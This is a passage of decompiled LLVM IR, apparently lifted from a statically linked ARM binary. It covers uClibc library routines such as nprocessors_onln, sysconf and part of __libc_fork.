  call void @__pseudo_branch(i32 %v4_13bd4)
  %v0_13be4 = load i32, i32* @r5, align 4
  %v2_13be4 = add i32 %v0_13be4, 636
  %v3_13be4 = inttoptr i32 %v2_13be4 to i32*
  %v4_13be4 = load i32, i32* %v3_13be4, align 4
  %v2_13bec = icmp eq i32 %v4_13be4, 0
  br i1 %v2_13bec, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_13bf8 = xor i1 %v2_13bec, true
  call void @__pseudo_cond_branch(i1 %v2_13bf8, i32 %v4_13be4)
  store i32 %v2_13ba8, i32* @r0, align 4
  %v0_13c08 = load i32, i32* @r5, align 4
  %v2_13c08 = add i32 %v0_13c08, 44
  %v3_13c08 = inttoptr i32 %v2_13c08 to i32*
  %v4_13c08 = load i32, i32* %v3_13c08, align 4
  call void @__pseudo_branch(i32 %v4_13c08)
  %v0_13c14 = call i32 @__GI___uClibc_fini()
  %v0_13c1c = load i32, i32* @r5, align 4
  %v2_13c1c = add i32 %v0_13c1c, -47784
  %v2_13c24 = icmp eq i32 %v2_13c1c, 0
  br i1 %v2_13c24, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_13c2c = xor i1 %v2_13c24, true
  call void @__pseudo_cond_branch(i1 %v2_13c2c, i32 %v2_13c1c)
  %v0_13c30 = load i32, i32* @r6, align 4
  %v1_13c34 = call i32 @__GI__exit(i32 %v0_13c30)
  %v0_13c38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c38, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_13c50 = phi i32 [ %v1_13c34, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_13c50

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_13c78 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -34012))
  store i32 %v1_13c78, i32* @r6, align 4
  %v2_13c7c = icmp eq i32 %v1_13c78, 0
  br i1 %v2_13c7c, label %dec_label_pc_13cfc, label %dec_label_pc_13c84

dec_label_pc_13c84:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_13c8c = load i32, i32* @r4, align 4
  %v2_13c8c = add i32 %v0_13c8c, -34000
  store i32 %v2_13c8c, i32* @r8, align 4
  %v2_13c90 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13c90, i32* @r7, align 4
  br label %bb18

dec_label_pc_13c98:                               ; preds = %bb18
  %v3_13c98 = load i32, i32* %stack_var_-36, align 4
  %v1_13c9c = inttoptr i32 %v3_13c98 to i32*
  %v2_13c9c = load i32, i32* %v1_13c9c, align 4
  %v1_13ca0 = inttoptr i32 %v2_13c9c to i8*
  %v2_13ca0 = load i8, i8* %v1_13ca0, align 1
  %v7_13ca4 = icmp eq i8 %v2_13ca0, 99
  br i1 %v7_13ca4, label %dec_label_pc_13cac, label %.backedge3

dec_label_pc_13cac:                               ; preds = %dec_label_pc_13c98
  %v1_13cac = add i32 %v2_13c9c, 1
  %v2_13cac = inttoptr i32 %v1_13cac to i8*
  %v3_13cac = load i8, i8* %v2_13cac, align 1
  %v7_13cb0 = icmp eq i8 %v3_13cac, 112
  br i1 %v7_13cb0, label %dec_label_pc_13cb8, label %.backedge3

dec_label_pc_13cb8:                               ; preds = %dec_label_pc_13cac
  %v1_13cb8 = add i32 %v2_13c9c, 2
  %v2_13cb8 = inttoptr i32 %v1_13cb8 to i8*
  %v3_13cb8 = load i8, i8* %v2_13cb8, align 1
  %v7_13cbc = icmp eq i8 %v3_13cb8, 117
  br i1 %v7_13cbc, label %dec_label_pc_13cc4, label %.backedge3

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13cb8
  %v1_13cc4 = add i32 %v2_13c9c, 3
  %v2_13cc4 = inttoptr i32 %v1_13cc4 to i8*
  %v3_13cc4 = load i8, i8* %v2_13cc4, align 1
  %v4_13cc4 = zext i8 %v3_13cc4 to i32
  %v0_13cc8 = load i32, i32* @r4, align 4
  %v1_13cc8 = load i32, i32* @sl, align 4
  %v2_13cc8 = add i32 %v1_13cc8, %v0_13cc8
  %v3_13cc8 = inttoptr i32 %v2_13cc8 to i32*
  %v4_13cc8 = load i32, i32* %v3_13cc8, align 4
  %v2_13ccc = mul nuw nsw i32 %v4_13cc4, 2
  %v2_13cd0 = add i32 %v4_13cc8, %v2_13ccc
  %v3_13cd0 = inttoptr i32 %v2_13cd0 to i16*
  %v4_13cd0 = load i16, i16* %v3_13cd0, align 2
  %v1_13cd4 = and i16 %v4_13cd0, 8
  %v2_13cd4 = icmp eq i16 %v1_13cd4, 0
  br i1 %v2_13cd4, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13cc4
  %v1_13cd8 = load i32, i32* @r5, align 4
  %v2_13cd8 = add i32 %v1_13cd8, 1
  store i32 %v2_13cd8, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13cc4, %dec_label_pc_13c98, %dec_label_pc_13cac, %dec_label_pc_13cb8
  %v0_13cdc.pre = load i32, i32* @r6, align 4
  %v0_13ce8.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_13c84
  %v0_13ce8 = phi i32 [ %v0_13ce8.pre, %.backedge3 ], [ %v2_13c8c, %dec_label_pc_13c84 ]
  %v0_13cdc = phi i32 [ %v0_13cdc.pre, %.backedge3 ], [ %v1_13c78, %dec_label_pc_13c84 ]
  %v4_13cec = inttoptr i32 %v0_13cdc to i32*
  %v5_13cec = call i32 @__GI_config_read(i32* %v4_13cec, i32 %v2_13c90, i32 258, i32 %v0_13ce8)
  %v2_13cf0 = icmp eq i32 %v5_13cec, 0
  br i1 %v2_13cf0, label %dec_label_pc_13d60, label %dec_label_pc_13c98

dec_label_pc_13cfc:                               ; preds = %entry
  %v0_13d00 = load i32, i32* @r4, align 4
  %v2_13d00 = add i32 %v0_13d00, -33996
  store i32 %v2_13d00, i32* @r0, align 4
  %v1_13d04 = call i32 @__GI_config_open(i32 %v2_13d00)
  store i32 %v1_13d04, i32* @r6, align 4
  %v2_13d08 = icmp eq i32 %v1_13d04, 0
  br i1 %v2_13d08, label %bb19, label %dec_label_pc_13d14

bb19:                                             ; preds = %dec_label_pc_13cfc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13d60

dec_label_pc_13d14:                               ; preds = %dec_label_pc_13cfc
  %v0_13d18 = load i32, i32* @r4, align 4
  %v2_13d18 = add i32 %v0_13d18, -33980
  store i32 %v2_13d18, i32* @r8, align 4
  %v2_13d20 = add i32 %v0_13d18, -33944
  store i32 %v2_13d20, i32* @r7, align 4
  %v2_13d24 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13d24, i32* @r4, align 4
  br label %bb21

dec_label_pc_13d2c:                               ; preds = %bb21
  %v0_13d58 = load i32, i32* @r8, align 4
  %v3_13d2c = load i32, i32* %stack_var_-36, align 4
  %v1_13d30 = inttoptr i32 %v3_13d2c to i32*
  %v2_13d30 = load i32, i32* %v1_13d30, align 4
  store i32 %v2_13d30, i32* @r1, align 4
  %v2_13d34 = inttoptr i32 %v0_13d58 to i8*
  %v3_13d34 = call i32 @__GI_strcoll(i8* %v2_13d34, i32 %v2_13d30)
  %v2_13d38 = icmp eq i32 %v3_13d34, 0
  br i1 %v2_13d38, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13d2c
  %v1_13d3c = load i32, i32* @r5, align 4
  %v2_13d3c = add i32 %v1_13d3c, 1
  store i32 %v2_13d3c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13d2c
  %v0_13d48.pre = load i32, i32* @r7, align 4
  %v0_13d4c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_13d14
  %v0_13d4c = phi i32 [ %v0_13d4c.pre, %.backedge ], [ %v1_13d04, %dec_label_pc_13d14 ]
  %v0_13d48 = phi i32 [ %v0_13d48.pre, %.backedge ], [ %v2_13d20, %dec_label_pc_13d14 ]
  %v4_13d50 = inttoptr i32 %v0_13d4c to i32*
  %v5_13d50 = call i32 @__GI_config_read(i32* %v4_13d50, i32 %v2_13d24, i32 459266, i32 %v0_13d48)
  %v2_13d54 = icmp eq i32 %v5_13d50, 0
  br i1 %v2_13d54, label %dec_label_pc_13d60, label %dec_label_pc_13d2c

dec_label_pc_13d60:                               ; preds = %bb18, %bb21, %bb19
  %v0_13d60 = load i32, i32* @r6, align 4
  %v1_13d64 = inttoptr i32 %v0_13d60 to i32*
  %v2_13d64 = call i32 @__GI_config_close(i32* %v1_13d64)
  %v0_13d68 = load i32, i32* @r5, align 4
  %v2_13d68 = icmp eq i32 %v0_13d68, 0
  %.v0_13d68 = select i1 %v2_13d68, i32 1, i32 %v0_13d68
  ret i32 %.v0_13d68

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13d60, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_14194

bb:                                               ; preds = %entry
  %v7_13db8 = mul i32 %arg1, 4
  %v8_13db8 = add i32 %v7_13db8, ptrtoint (i32* @global_var_13dc0.513 to i32)
  call void @__pseudo_branch(i32 %v8_13db8)
  br label %dec_label_pc_14194

dec_label_pc_14194:                               ; preds = %bb, %entry
  %v0_14198 = call i32 @__aeabi_read_tp()
  %v3_1419c = load i16, i16* @global_var_22294.357, align 2
  %v4_1419c = sext i16 %v3_1419c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_141a8 = add i32 %v4_1419c, %v0_14198
  %v4_141a8 = inttoptr i32 %v3_141a8 to i32*
  store i32 22, i32* %v4_141a8, align 4
  %v0_1438c = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_1438c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12820, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r8.global-to-local, align 4
  %v4_144b816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 12820) to i32*), align 4
  store i32 %v4_144b816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144bc18 = icmp eq i32 %v4_144b816, 0
  br i1 %v2_144bc18, label %dec_label_pc_144c4, label %dec_label_pc_143e8

dec_label_pc_143e8:                               ; preds = %entry, %dec_label_pc_144b8.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_143f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_143f4 = add i32 %v0_143f4, 20
  %v2_143f4 = inttoptr i32 %v1_143f4 to i32*
  %v3_143f4 = load i32, i32* %v2_143f4, align 4
  store i32 %v3_143f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143f8 = icmp eq i32 %v3_143f4, 0
  store i32 %v3_143f4, i32* %r4.global-to-local, align 4
  br i1 %v2_143f8, label %dec_label_pc_144b8.backedge, label %dec_label_pc_14408

dec_label_pc_144b8.backedge:                      ; preds = %dec_label_pc_143e8, %dec_label_pc_14434
  %v0_144b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_144b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_144b8 = add i32 %v1_144b8, %v0_144b8
  %v3_144b8 = inttoptr i32 %v2_144b8 to i32*
  %v4_144b8 = load i32, i32* %v3_144b8, align 4
  store i32 %v4_144b8, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144bc = icmp eq i32 %v4_144b8, 0
  br i1 %v2_144bc, label %dec_label_pc_144c4, label %dec_label_pc_143e8

dec_label_pc_14408:                               ; preds = %dec_label_pc_143e8
  %v0_14408 = load i32, i32* %r8.global-to-local, align 4
  %v1_14408 = load i32, i32* %r5.global-to-local, align 4
  %v2_14408 = add i32 %v1_14408, %v0_14408
  %v3_14408 = inttoptr i32 %v2_14408 to i32*
  %v4_14408 = load i32, i32* %v3_14408, align 4
  %v1_1440c = add i32 %v4_14408, 20
  store i32 %v1_1440c, i32* %r2.global-to-local, align 4
  %v1_14410132 = inttoptr i32 %v1_1440c to i32*
  %v2_14410133 = load i32, i32* %v1_14410132, align 4
  store i32 %v2_14410133, i32* %r3.global-to-local, align 4
  %v3_14414135 = icmp uge i32 %v2_14410133, %v3_143f4
  store i1 %v3_14414135, i1* %cpsr_c.global-to-local, align 1
  %v9_14414141 = icmp eq i32 %v2_14410133, %v3_143f4
  br i1 %v9_14414141, label %dec_label_pc_1441c, label %dec_label_pc_14434

dec_label_pc_1441c:                               ; preds = %dec_label_pc_14408, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge
  %v0_1441c142 = phi i32 [ %v1_14414.pre, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge ], [ %v3_143f4, %dec_label_pc_14408 ]
  store i32 %v0_1441c142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1442c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1442c, label %dec_label_pc_14430, label %dec_label_pc_1441c.dec_label_pc_14410_crit_edge

dec_label_pc_1441c.dec_label_pc_14410_crit_edge:  ; preds = %dec_label_pc_1441c
  %v0_14410.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14414.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14410 = inttoptr i32 %v0_14410.pre to i32*
  %v2_14410 = load i32, i32* %v1_14410, align 4
  store i32 %v2_14410, i32* %r3.global-to-local, align 4
  %v3_14414 = icmp uge i32 %v2_14410, %v1_14414.pre
  store i1 %v3_14414, i1* %cpsr_c.global-to-local, align 1
  %v9_14414 = icmp eq i32 %v2_14410, %v1_14414.pre
  br i1 %v9_14414, label %dec_label_pc_1441c, label %dec_label_pc_14434

dec_label_pc_14430:                               ; preds = %dec_label_pc_1441c
  %v0_14430 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14430, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14434

dec_label_pc_14434:                               ; preds = %dec_label_pc_14408, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge, %dec_label_pc_14430
  %v0_14434 = phi i32 [ %v0_14430, %dec_label_pc_14430 ], [ %v2_14410133, %dec_label_pc_14408 ], [ %v2_14410, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge ]
  %v1_14434 = phi i32 [ %v0_14430, %dec_label_pc_14430 ], [ %v3_143f4, %dec_label_pc_14408 ], [ %v1_14414.pre, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge ]
  %v3_14434 = icmp uge i32 %v0_14434, %v1_14434
  store i1 %v3_14434, i1* %cpsr_c.global-to-local, align 1
  %v9_14434 = icmp eq i32 %v0_14434, %v1_14434
  br i1 %v9_14434, label %dec_label_pc_1443c, label %dec_label_pc_144b8.backedge

dec_label_pc_1443c:                               ; preds = %dec_label_pc_14434
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_14450 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_14440

dec_label_pc_14440:                               ; preds = %dec_label_pc_144a8, %dec_label_pc_1443c
  %v0_14440 = load i32, i32* %r7.global-to-local, align 4
  %v1_14440 = add i32 %v0_14440, 4
  %v2_14440 = inttoptr i32 %v1_14440 to i32*
  %v3_14440 = load i32, i32* %v2_14440, align 4
  store i32 %v3_14440, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14444 = icmp eq i32 %v3_14440, 0
  br i1 %v2_14444, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_14440
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_14440, %bb
  %v2_1444c = xor i1 %v2_14444, true
  call void @__pseudo_cond_branch(i1 %v2_1444c, i32 %v3_14440)
  %v0_14454 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14454, i32* %stack_var_-88, align 4
  %v1_14458 = inttoptr i32 %v0_14454 to i32*
  %v2_14458 = load i32, i32* %v1_14458, align 4
  store i32 %v2_14458, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1445c = icmp eq i32 %v2_14458, 0
  store i32 %v2_14450, i32* %r5.global-to-local, align 4
  br i1 %v2_1445c, label %dec_label_pc_144c8.loopexit, label %dec_label_pc_14470

dec_label_pc_14470:                               ; preds = %bb72
  %v1_14470 = add i32 %v2_14458, 20
  store i32 %v1_14470, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14474

dec_label_pc_14474:                               ; preds = %dec_label_pc_144a8.dec_label_pc_14474_crit_edge, %dec_label_pc_14470
  %v0_14478 = phi i32 [ %v0_14478.pre, %dec_label_pc_144a8.dec_label_pc_14474_crit_edge ], [ %v1_14470, %dec_label_pc_14470 ]
  %v0_14474 = phi i32 [ %v0_14474.pre, %dec_label_pc_144a8.dec_label_pc_14474_crit_edge ], [ %v2_14458, %dec_label_pc_14470 ]
  %v1_14474 = add i32 %v0_14474, 20
  %v2_14474 = inttoptr i32 %v1_14474 to i32*
  %v3_14474 = load i32, i32* %v2_14474, align 4
  store i32 %v0_14478, i32* %r2.global-to-local, align 4
  store i32 %v3_14474, i32* %r4.global-to-local, align 4
  %v1_14484119 = inttoptr i32 %v0_14478 to i32*
  %v2_14484120 = load i32, i32* %v1_14484119, align 4
  store i32 %v2_14484120, i32* %r3.global-to-local, align 4
  %v3_14488122 = icmp uge i32 %v2_14484120, %v3_14474
  store i1 %v3_14488122, i1* %cpsr_c.global-to-local, align 1
  %v9_14488128 = icmp eq i32 %v2_14484120, %v3_14474
  br i1 %v9_14488128, label %dec_label_pc_14490, label %dec_label_pc_144a8

dec_label_pc_14490:                               ; preds = %dec_label_pc_14474, %dec_label_pc_14490.dec_label_pc_14484_crit_edge
  %v0_14490129 = phi i32 [ %v1_14488.pre, %dec_label_pc_14490.dec_label_pc_14484_crit_edge ], [ %v3_14474, %dec_label_pc_14474 ]
  store i32 %v0_14490129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_144a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_144a0, label %dec_label_pc_144a4, label %dec_label_pc_14490.dec_label_pc_14484_crit_edge

dec_label_pc_14490.dec_label_pc_14484_crit_edge:  ; preds = %dec_label_pc_14490
  %v0_14484.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14488.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14484 = inttoptr i32 %v0_14484.pre to i32*
  %v2_14484 = load i32, i32* %v1_14484, align 4
  store i32 %v2_14484, i32* %r3.global-to-local, align 4
  %v3_14488 = icmp uge i32 %v2_14484, %v1_14488.pre
  store i1 %v3_14488, i1* %cpsr_c.global-to-local, align 1
  %v9_14488 = icmp eq i32 %v2_14484, %v1_14488.pre
  br i1 %v9_14488, label %dec_label_pc_14490, label %dec_label_pc_144a8

dec_label_pc_144a4:                               ; preds = %dec_label_pc_14490
  %v0_144a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_144a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_144a8

dec_label_pc_144a8:                               ; preds = %dec_label_pc_14474, %dec_label_pc_14490.dec_label_pc_14484_crit_edge, %dec_label_pc_144a4
  %v0_144a8 = phi i32 [ %v0_144a4, %dec_label_pc_144a4 ], [ %v2_14484120, %dec_label_pc_14474 ], [ %v2_14484, %dec_label_pc_14490.dec_label_pc_14484_crit_edge ]
  %v1_144a8 = phi i32 [ %v0_144a4, %dec_label_pc_144a4 ], [ %v3_14474, %dec_label_pc_14474 ], [ %v1_14488.pre, %dec_label_pc_14490.dec_label_pc_14484_crit_edge ]
  %v3_144a8 = icmp uge i32 %v0_144a8, %v1_144a8
  store i1 %v3_144a8, i1* %cpsr_c.global-to-local, align 1
  %v9_144a8 = icmp eq i32 %v0_144a8, %v1_144a8
  store i32 %v2_14450, i32* %r4.global-to-local, align 4
  br i1 %v9_144a8, label %dec_label_pc_14440, label %dec_label_pc_144a8.dec_label_pc_14474_crit_edge

dec_label_pc_144a8.dec_label_pc_14474_crit_edge:  ; preds = %dec_label_pc_144a8
  %v0_14474.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14478.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14474

dec_label_pc_144c4:                               ; preds = %dec_label_pc_144b8.backedge, %entry
  %v0_144cc31 = phi i32 [ ptrtoint (i32* @global_var_2223c.361 to i32), %entry ], [ %v0_144b8, %dec_label_pc_144b8.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_144c8

dec_label_pc_144c8.loopexit:                      ; preds = %bb72
  store i32 %v2_14450, i32* %r6.global-to-local, align 4
  %v0_144cc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_144c8

dec_label_pc_144c8:                               ; preds = %dec_label_pc_144c8.loopexit, %dec_label_pc_144c4
  %v0_144cc = phi i32 [ %v0_144cc.pre, %dec_label_pc_144c8.loopexit ], [ %v0_144cc31, %dec_label_pc_144c4 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_144cc = add i32 %v0_144cc, 152
  %v3_144cc = inttoptr i32 %v2_144cc to i32*
  %v4_144cc = load i32, i32* %v3_144cc, align 4
  store i32 %v4_144cc, i32* %r7.global-to-local, align 4
  %v0_144d0 = call i32 @__aeabi_read_tp()
  store i32 %v0_144d0, i32* %r0.global-to-local, align 4
  %v1_144d4 = add i32 %v4_144cc, 8
  %v2_144d4 = inttoptr i32 %v1_144d4 to i32*
  %v3_144d4 = load i32, i32* %v2_144d4, align 4
  store i32 %v3_144d4, i32* %r3.global-to-local, align 4
  %v1_144d8 = add i32 %v0_144d0, -1168
  store i32 %v1_144d8, i32* %r5.global-to-local, align 4
  %v3_144dc = icmp uge i32 %v3_144d4, %v1_144d8
  store i1 %v3_144dc, i1* %cpsr_c.global-to-local, align 1
  %v9_144dc = icmp eq i32 %v3_144d4, %v1_144d8
  br i1 %v9_144dc, label %dec_label_pc_14644, label %dec_label_pc_144e4

dec_label_pc_144e4:                               ; preds = %dec_label_pc_144c8
  store i32 %v4_144cc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_144f0112 = inttoptr i32 %v4_144cc to i32*
  %v2_144f0113 = load i32, i32* %v1_144f0112, align 4
  store i32 %v2_144f0113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_144f4115 = icmp eq i32 %v2_144f0113, 0
  br i1 %v9_144f4115, label %dec_label_pc_144fc, label %dec_label_pc_14514

dec_label_pc_144fc:                               ; preds = %dec_label_pc_144e4, %dec_label_pc_144fc.dec_label_pc_144f0_crit_edge
  %v0_144fc116 = phi i32 [ %v1_144f4.pre, %dec_label_pc_144fc.dec_label_pc_144f0_crit_edge ], [ 0, %dec_label_pc_144e4 ]
  store i32 %v0_144fc116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1450c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1450c, label %dec_label_pc_14510, label %dec_label_pc_144fc.dec_label_pc_144f0_crit_edge

dec_label_pc_144fc.dec_label_pc_144f0_crit_edge:  ; preds = %dec_label_pc_144fc
  %v0_144f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_144f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_144f0 = inttoptr i32 %v0_144f0.pre to i32*
  %v2_144f0 = load i32, i32* %v1_144f0, align 4
  store i32 %v2_144f0, i32* %r3.global-to-local, align 4
  %v3_144f4 = icmp uge i32 %v2_144f0, %v1_144f4.pre
  store i1 %v3_144f4, i1* %cpsr_c.global-to-local, align 1
  %v9_144f4 = icmp eq i32 %v2_144f0, %v1_144f4.pre
  br i1 %v9_144f4, label %dec_label_pc_144fc, label %dec_label_pc_14514

dec_label_pc_14510:                               ; preds = %dec_label_pc_144fc
  %v0_14510 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14510, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14514

dec_label_pc_14514:                               ; preds = %dec_label_pc_144e4, %dec_label_pc_144fc.dec_label_pc_144f0_crit_edge, %dec_label_pc_14510
  %v0_14514 = phi i32 [ %v0_14510, %dec_label_pc_14510 ], [ %v2_144f0113, %dec_label_pc_144e4 ], [ %v2_144f0, %dec_label_pc_144fc.dec_label_pc_144f0_crit_edge ]
  %v1_14514 = phi i32 [ %v0_14510, %dec_label_pc_14510 ], [ 0, %dec_label_pc_144e4 ], [ %v1_144f4.pre, %dec_label_pc_144fc.dec_label_pc_144f0_crit_edge ]
  %v3_14514 = icmp uge i32 %v0_14514, %v1_14514
  store i1 %v3_14514, i1* %cpsr_c.global-to-local, align 1
  %v9_14514 = icmp eq i32 %v0_14514, %v1_14514
  br i1 %v9_14514, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_14514
  %v1_14518 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14518, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_14514, %bb73
  %v1_1451c = xor i1 %v9_14514, true
  call void @__pseudo_cond_branch(i1 %v1_1451c, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_14520 = load i32, i32* %r5.global-to-local, align 4
  %v1_14520 = load i32, i32* %r7.global-to-local, align 4
  %v2_14520 = add i32 %v1_14520, 8
  %v3_14520 = inttoptr i32 %v2_14520 to i32*
  store i32 %v0_14520, i32* %v3_14520, align 4
  br label %dec_label_pc_14644

dec_label_pc_14644:                               ; preds = %bb74, %dec_label_pc_144c8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_14528 = load i32, i32* %r8.global-to-local, align 4
  %v2_14528 = add i32 %v0_14528, 152
  %v3_14528 = inttoptr i32 %v2_14528 to i32*
  %v4_14528 = load i32, i32* %v3_14528, align 4
  store i32 %v4_14528, i32* %r2.global-to-local, align 4
  %v1_1452c = add i32 %v4_14528, 4
  %v2_1452c = inttoptr i32 %v1_1452c to i32*
  %v3_1452c = load i32, i32* %v2_1452c, align 4
  %v1_14530 = add i32 %v3_1452c, 1
  store i32 %v1_14530, i32* %r3.global-to-local, align 4
  store i32 %v1_14530, i32* %v2_1452c, align 4
  %v0_14538 = load i32, i32* %r5.global-to-local, align 4
  %v1_14538 = add i32 %v0_14538, 108
  %v2_14538 = inttoptr i32 %v1_14538 to i32*
  %v3_14538 = load i32, i32* %v2_14538, align 4
  store i32 %v3_14538, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_14540 = sub i32 0, %v3_14538
  store i32 %v1_14540, i32* %v2_14538, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_14554 = load i32, i32* %r5.global-to-local, align 4
  %v1_14554 = add i32 %v0_14554, 104
  store i32 %v1_14554, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_14648.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_14648 = add i32 %v0_14554, 108
  %v3_14648 = inttoptr i32 %v2_14648 to i32*
  store i32 %v0_14648.pre, i32* %v3_14648, align 4
  %v0_1464c = load i32, i32* %r8.global-to-local, align 4
  %v1_1464c = load i32, i32* %r3.global-to-local, align 4
  %v2_1464c = add i32 %v1_1464c, %v0_1464c
  %v3_1464c = inttoptr i32 %v2_1464c to i32*
  %v4_1464c = load i32, i32* %v3_1464c, align 4
  store i32 %v4_1464c, i32* %r0.global-to-local, align 4
  %v1_14650 = add i32 %v4_1464c, 4
  %v2_14650 = inttoptr i32 %v1_14650 to i32*
  %v3_14650 = load i32, i32* %v2_14650, align 4
  %v1_14654 = add i32 %v3_14650, -1
